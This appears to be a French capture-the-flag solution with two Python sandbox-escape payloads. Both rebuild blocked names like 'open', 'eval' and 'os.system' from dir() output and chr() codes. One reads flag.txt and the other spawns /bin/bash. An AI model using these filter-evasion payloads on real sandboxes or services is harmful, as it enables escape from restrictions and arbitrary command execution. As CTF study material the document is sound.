# Lire le flag :

```bash
opn = dir()[1][5] + dir()[8][2] + dir()[3][6] + dir()[1][3] # => opn = "open"
flag = dir()[5][2] + dir()[0][3] + dir()[0][1] + dir()[8][7] # => flag = "flag"
txt = dir()[1][6] + dir()[11][1] + dir()[1][6] # => txt = "txt"
rhc = dir()[3][2] + dir()[3][5] + dir()[6][7] # => rhc = "chr"
read = dir()[6][7] + dir()[3][6] + dir()[0][1] + dir()[3][7] # => read = "read"
dot = getattr(__builtins__, rhc)(46) # => dot = "."
full_flag = flag + dot + txt # => full_flag = "flag.txt"
var1 = getattr(__builtins__, opn)(full_flag) # => var1 = open("flag.txt")
print(getattr(var1, read)()) # => print(var1.read())
```

# Ouvrir un shell :

```bash
rhc = dir()[3][2] + dir()[3][5] + dir()[6][7] # => rhc = "chr"
new_crh = getattr(__builtins__, rhc) # => new_crh = chr()
eva = new_crh(101) + new_crh(118) + new_crh(97) + new_crh(108) # => eva = "eval"
new_eva = getattr(__builtins__, eva) # => new_eva = eval()
shell = new_crh(47) + new_crh(98) + new_crh(105) + new_crh(110) + new_crh(47) + new_crh(98) + new_crh(97) + new_crh(115) + new_crh(104) # => shell = "/bin/bash"
syo = new_crh(111) + new_crh(115) + new_crh(46) + new_crh(115) + new_crh(121) + new_crh(115) + new_crh(116) + new_crh(101) + new_crh(109) # => syo = "os.system"
new_eva(syo)(shell) # => eval(os.system("/bin/bash"))
```
